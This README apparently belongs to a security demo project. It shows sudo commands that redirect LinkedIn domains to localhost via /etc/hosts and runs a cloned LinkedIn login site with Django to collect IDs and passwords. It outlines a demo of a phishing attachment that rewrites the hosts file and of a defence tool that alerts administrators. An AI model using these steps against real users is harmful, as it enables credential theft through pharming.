# Hacking
## Requirement
1. django 설치
2. python 설치

## DNS Fishing Code
```
sudo sed -i '1i127.0.0.1 linkedin.co.kr' /etc/hosts
sudo sed -i '1i127.0.0.1 linkedin.com' /etc/hosts
sudo sed -i '1i127.0.0.1 www.linkedin.com' /etc/hosts
sudo sed -i '1i127.0.0.1 www.linkedin.co.kr' /etc/hosts
sudo sed -i '1i127.0.0.1 kr.linkedin.co.kr' /etc/hosts
```

## Pharming WebSite Execution
```
cd ${Clone Path}
python manage.py runserver 127.0.0.1:80
```

## Modifiy host file
Refer to ./shellcode/README file


## Access Link
linkedin.co.kr/login




# 영상촬영 시나리오
1. 유지보수업체 임직원 PC 메일(첨부파일) 수신
=> /etc/hosts 파일 수정 전
=> 첨부파일 실행
=> PDF OPEN => /etc/hosts 파일 수정된 모습

설명 : 윈도우 동작 실행파일 또한 존재

2. 유지보수업체 임직원 메일(링크) 수신
CSV Display(Before)
링크 클릭
ID PW 입력
CSV Display(After)

설명 : DNS Spoofing 대신 /etc/hosts 수정

3. 방어도구 ON
유지보수업체 임직원 메일 수신 시 문자메세지 팝업 이미지
[Accept 버튼]

근무시간(09~18시) 설정
[Reject 버튼] 클릭
=> 관리자에게 메일 수신 X

근무시간 22시 설정
[Reject 버튼]
=> 관리자에게 메일 수신되는 모습 Display


SimpleScreenRecorder
